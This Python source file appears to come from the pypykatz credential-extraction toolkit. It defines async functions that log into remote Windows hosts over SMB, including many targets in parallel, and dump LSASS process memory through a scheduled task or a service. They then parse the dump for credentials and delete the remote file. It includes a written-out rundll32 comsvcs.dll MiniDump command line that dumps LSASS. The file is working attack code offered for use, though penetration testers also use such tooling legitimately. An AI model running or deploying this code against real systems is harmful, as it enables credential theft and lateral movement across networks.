import asyncio
import os
import itertools

from aiosmb.examples.smbshareenum import SMBFileEnum, ListTargetGen, FileTargetGen

def natatime(n, iterable, fillvalue = None):
	"""Returns an iterator yielding `n` elements at a time.
	:param n: the number of elements to return at each iteration
	:param iterable: the iterable over which to iterate
	:param fillvalue: the value to use for missing elements
	:Example:
	>>> for (a,b,c) in natatime(3, [1,2,3,4,5], fillvalue = "?"):
		...   print a, b, c
		...
	1 2 3
	4 5 ?
	"""
	stepped_slices = ( itertools.islice(iterable, i, None, n) for i in range(n) )
	return itertools.zip_longest(*stepped_slices, fillvalue = fillvalue)


from pypykatz import logging

async def lsassfile(url, packages = ['all'], chunksize = 64*1024):
	from aiosmb.commons.connection.url import SMBConnectionURL
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
	from pypykatz.apypykatz import apypykatz

	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()
	smbfile = smburl.get_file()

	async with connection:
		logging.debug('[LSASSFILE] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logging.debug('[LSASSFILE] Connected!')
		logging.debug('[LSASSFILE] Opening LSASS dump file...')
		_, err = await smbfile.open(connection)
		if err is not None:
			raise err
		
		logging.debug('[LSASSFILE] LSASS file opened!')
		logging.debug('[LSASSFILE] parsing LSASS file...')
		mimi = await apypykatz.parse_minidump_external(SMBFileReader(smbfile), chunksize=chunksize, packages = packages)
		logging.debug('[LSASSFILE] LSASS file parsed OK!')
		return mimi

async def lsassdump(url, method = 'task', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',chunksize = 64*1024, packages = ['all'], targets = [], worker_cnt = 5):
	from aiosmb.commons.connection.url import SMBConnectionURL
	
	base_url = None
	base_conn = None
	mimis = []
	workers = []

	tgens = []
	if targets is not None and len(targets) != 0:
		notfile = []
		if targets is not None:
			for target in targets:
				try:
					f = open(target, 'r')
					f.close()
					tgens.append(FileTargetGen(target))
				except:
					notfile.append(target)
			
			if len(notfile) > 0:
				tgens.append(ListTargetGen(notfile))

	if isinstance(url, SMBConnectionURL):
		base_url = url
		base_conn = url.get_connection()
	else:
		base_url = SMBConnectionURL(url)
		base_conn = base_url.get_connection()
	
	lsassdump_coro = lsassdump_single(
		base_conn.target.get_hostname_or_ip(), 
		base_conn, 
		method = method, 
		remote_base_path = remote_base_path, 
		remote_share_name = remote_share_name, 
		chunksize = chunksize, 
		packages = packages
	)
	workers.append(lsassdump_coro)

	for tgen in tgens:
		async for _, target, err in tgen.generate():
			tconn = base_url.create_connection_newtarget(target)
			lsassdump_coro = lsassdump_single(
				tconn.target.get_hostname_or_ip(), 
				tconn, 
				method = method, 
				remote_base_path = remote_base_path, 
				remote_share_name = remote_share_name, 
				chunksize = chunksize, 
				packages = packages
			)
			workers.append(lsassdump_coro)
			if len(workers) >= worker_cnt:
				tres = await asyncio.gather(*workers)
				for res in tres:
					yield res
				workers = []

	if len(workers) > 0:
		tres = await asyncio.gather(*workers)
		for res in tres:
			yield res
		workers = []


async def lsassdump_single(targetid, connection, method = 'task', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',chunksize = 64*1024, packages = ['all']):
	try:
		from aiosmb.commons.exceptions import SMBException
		from aiosmb.wintypes.ntstatus import NTStatus
		from aiosmb.commons.interfaces.machine import SMBMachine
		from pypykatz.alsadecryptor.asbmfile import SMBFileReader
		from aiosmb.commons.interfaces.file import SMBFile
		from pypykatz.apypykatz import apypykatz

		if remote_base_path.endswith('\\') is False:
			remote_base_path += '\\'

		if remote_share_name.endswith('\\') is False:
			remote_share_name += '\\'

		fname = '%s.%s' % (os.urandom(5).hex(), os.urandom(3).hex())
		filepath = remote_base_path + fname
		filesharepath = remote_share_name + fname
		
		if method == 'task':
			cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {} full""".format(filepath)
			commands = [cmd]
		
		elif method == 'service':
			cmd = ''
		
		else:
			raise Exception('Unknown execution method %s' % method)

		mimi = None
		async with connection:
			logging.debug('[LSASSDUMP][%s] Connecting to server...' % targetid)
			_, err = await connection.login()
			if err is not None:
				raise err
			logging.debug('[LSASSDUMP][%s] Connected!' % targetid)
			async with SMBMachine(connection) as machine:
				if method == 'task':
					logging.debug('[LSASSDUMP][%s] Start dumping LSASS with taskexec method!' % targetid)
					smbfile_inner, err = await machine.task_dump_lsass()
					
					if err is not None:
						raise err
					
					smbfile = SMBFileReader(smbfile_inner)
					
					#logging.debug('[LSASSDUMP][%s] Start dumping LSASS with taskexec method!' % targetid)
					#logging.info('[LSASSDUMP][%s] File location: %s' % (targetid,filepath))
					#_, err = await machine.tasks_execute_commands(commands)
					#if err is not None:
					#	raise err
					#
					#logging.debug('[LSASSDUMP][%s] Opening LSASS dump file...' % targetid)
					#for _ in range(5):
					#	logging.debug('[LSASSDUMP][%s] Sleeping a bit to let the remote host finish dumping' % targetid)
					#	await asyncio.sleep(5)
					#	smbfile = SMBFileReader(SMBFile.from_remotepath(connection, filesharepath))
					#	_, err = await smbfile.open(connection)
					#	if err is not None:
					#		if isinstance(err, SMBException):
					#			if err.ntstatus == NTStatus.SHARING_VIOLATION:
					#				logging.debug('[LSASSDUMP][%s] LSASS dump is not yet ready, retrying...' % targetid)
					#				#await asyncio.sleep(1)
					#				continue
					#		raise err
					#	break
					#else:
					#	raise err
				
				
				
				elif method == 'service':
					logging.debug('[LSASSDUMP][%s] Start dumping LSASS with serviceexec method!' % targetid)
					smbfile_inner, err = await machine.service_dump_lsass()
					
					if err is not None:
						raise err
					smbfile = SMBFileReader(smbfile_inner)

				else:
					raise Exception('Unknown execution method %s' % method)
			
			logging.debug('[LSASSDUMP][%s] LSASS dump file opened!' % targetid)
			logging.debug('[LSASSDUMP][%s] parsing LSASS dump file on the remote host...' % targetid)
			mimi = await apypykatz.parse_minidump_external(smbfile, chunksize=chunksize, packages = packages)

			logging.debug('[LSASSDUMP][%s] parsing OK!' % targetid)
			logging.debug('[LSASSDUMP][%s] Deleting remote dump file...' % targetid)
			_, err = await smbfile.delete()
			if err is not None:
				print('[%s] Failed to delete LSASS file! Reason: %s' % (targetid, err))
			else:
				print('[%s] Remote LSASS file deleted OK!' % targetid)
	
		return targetid, mimi, None
	except Exception as e:
		import traceback
		traceback.print_exc()
		return targetid, None, e